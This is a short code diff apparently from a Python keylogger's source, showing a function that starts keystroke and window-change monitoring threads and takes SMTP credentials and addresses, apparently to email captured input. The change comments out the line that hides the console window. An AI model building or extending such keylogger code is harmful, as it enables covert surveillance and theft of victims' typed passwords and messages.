@@ -80,7 +80,7 @@ def startkeylogger():
 		kbdlisten.join()
 
 def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
-	wg.ShowWindow(wc.GetConsoleWindow(),0);
+	#wg.ShowWindow(wc.GetConsoleWindow(),0);
 	startup()
 	wtthread = thread5.Thread(target=Checkifwindowchanged)
 	kthread = thread5.Thread(target=startkeylogger)
